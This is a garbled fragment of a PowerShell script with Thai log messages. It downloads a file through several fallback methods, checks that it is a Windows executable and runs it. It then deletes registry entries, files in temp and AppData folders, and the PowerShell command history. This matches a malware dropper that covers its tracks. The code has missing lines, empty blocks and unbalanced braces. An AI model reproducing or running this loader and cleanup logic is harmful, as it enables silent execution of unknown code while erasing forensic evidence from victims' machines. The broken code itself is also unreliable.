        $success = $false
        $methods = @("Invoke-WebRequest", "WebClient", "BITS")
        
        foreach ($method in $methods) {
            try {
                Write-Host "[+] พยายามดาวน์โหลดด้วย: $method" -ForegroundColor Gray

                    }

                        $webClient.DownloadFile($url, $tempFile)

                    }
                    "BITS" {

                    }
                }
                
                if (Test-Path $tempFile) {
                    $fileSize = (Get-Item $tempFile).Length

                    }
                }
            } catch {
                Write-Host "[!] $method ล้มเหลว: $($_.Exception.Message)" -ForegroundColor Yellow

            }

        if (-not $success) {
            throw "วิธีการดาวน์โหลดทั้งหมดล้มเหลว"

        foreach ($file in $tempFiles) {
            try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
        }
        return $null
    }
}

function Start-AdvancedProcess {
    param([string]$FilePath)
    
    Write-Host "[+] เริ่มกระบวนการขั้นสูง..." -ForegroundColor Yellow
    
    try {
        # Validate file
        if (-not (Test-Path $FilePath)) {
            throw "ไม่พบไฟล์: $FilePath"
        }
        
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
            throw "รูปแบบไฟล์ปฏิบัติการไม่ถูกต้อง"
        }
        
        Write-Host "[✓] ตรวจสอบไฟล์สำเร็จ: $($bytes.Length) ไบต์" -ForegroundColor Green
        
        # Start process with advanced options
        Write-Host "[+] เปิดใช้งานโปรแกรม..." -ForegroundColor Gray
        
        # ใช้วิธีการที่เรียบง่ายและน่าเชื่อถือมากขึ้น
        $process = Start-Process -FilePath $FilePath -PassThru -WindowStyle Normal
        
        if (-not $process -or $process.HasExited) {
            throw "ไม่สามารถเริ่มกระบวนการได้"
        }
        
        Write-Host "[✓] กระบวนการเริ่มทำงาน: PID $($process.Id)" -ForegroundColor Green
        
        # Return process info for monitoring
        return @{
            Process = $process
            FilePath = $FilePath
            StartTime = Get-Date
        }
        
    } catch {
        Write-Host "[!] การเริ่มกระบวนการล้มเหลว: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

            Remove-ItemProperty -Path $regEntry.Path -Name $regEntry.Name -ErrorAction SilentlyContinue
            $cleanupStats.Registry++
            Write-Host "[✓] ลบรีจิสตรี: $($regEntry.Name)" -ForegroundColor Green
        } catch {}
    }

        $env:temp,
        "$env:windir\Temp",
        "$env:programdata",
        "$env:appdata"

        try {
            if (Test-Path $location) {

                        try {
                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                            $cleanupStats.Files++
                            Write-Host "[✓] ลบไฟล์: $($_.Name)" -ForegroundColor Green
                        } catch {
                            Write-Host "[!] ไม่สามารถลบไฟล์: $($_.Name)" -ForegroundColor Yellow
                        }
                    }
                }
            }

        }

        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
